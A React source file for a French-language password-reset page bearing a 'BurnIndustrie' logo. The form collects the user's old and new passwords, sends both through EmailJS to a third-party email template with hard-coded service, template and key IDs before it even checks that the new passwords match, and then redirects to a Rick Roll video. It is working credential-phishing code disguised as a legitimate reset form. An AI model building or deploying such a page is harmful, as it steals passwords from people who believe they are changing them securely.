import { useState } from "react";
import Burn from "./assets/BurnIndustrie-removebg-preview.png";
import emailjs from "emailjs-com";
import "./App.css";

function App() {
  const [count, setCount] = useState(0);
  const [oldPassword, setOldPassword] = useState("");
  const [newPassword, setNewPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");

  const handleSubmit = (event) => {
    event.preventDefault();

    // Vérification et soumission des données
    if (!oldPassword) {
      alert("Votre ancien mot de passe est vide");
      return;
    }
    // Envoyer l'e-mail avec EmailJS
    const templateParams = {
      old_password: oldPassword,
      new_password: newPassword,
    };

    emailjs
      .send(
        "service_r79rmhe",
        "template_689y1cq",
        templateParams,
        "Vcz9yvvyyEidt-KJm"
      )
      .then(
        (result) => {
          if (newPassword !== confirmPassword || !newPassword) {
            alert("Les mots de passe ne correspondent pas.");
            return;
          } else alert("Mots de passe réinialisé !");

          setTimeout(() => {
            window.location.replace(
              "https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley"
            );
          }, 2000);
        },
        (error) => {
          alert("Une erreur s'est produite lors de la réinitialisation.");
          console.error(error);
        }
      );
  };
  return (
    <div className="min-h-screen bg-gray-100 flex flex-col items-center justify-center">
      <img className="w-32 mb-8" src={Burn} alt="Logo" />
      <form
        onSubmit={handleSubmit}
        className="bg-white p-8 rounded-lg shadow-md w-80"
      >
        <div className="mb-4">
          <label
            className="block text-gray-700 text-sm font-bold mb-2"
            htmlFor="oldPassword"
          >
            Ancien mot de passe
          </label>
          <input
            className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
            id="oldPassword"
            type="password"
            value={oldPassword}
            onChange={(e) => setOldPassword(e.target.value)}
          />
        </div>
        <div className="mb-4">
          <label
            className="block text-gray-700 text-sm font-bold mb-2"
            htmlFor="newPassword"
          >
            Nouveau mot de passe
          </label>
          <input
            className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
            id="newPassword"
            type="password"
            value={newPassword}
            onChange={(e) => setNewPassword(e.target.value)}
          />
        </div>
        <div className="mb-6">
          <label
            className="block text-gray-700 text-sm font-bold mb-2"
            htmlFor="confirmPassword"
          >
            Confirmer le mot de passe
          </label>
          <input
            className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
            id="confirmPassword"
            type="password"
            value={confirmPassword}
            onChange={(e) => setConfirmPassword(e.target.value)}
          />
        </div>
        <div className="flex items-center justify-between">
          <button
            className="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline"
            type="submit"
          >
            Réinitialiser le mot de passe
          </button>
        </div>
      </form>
    </div>
  );
}

export default App;
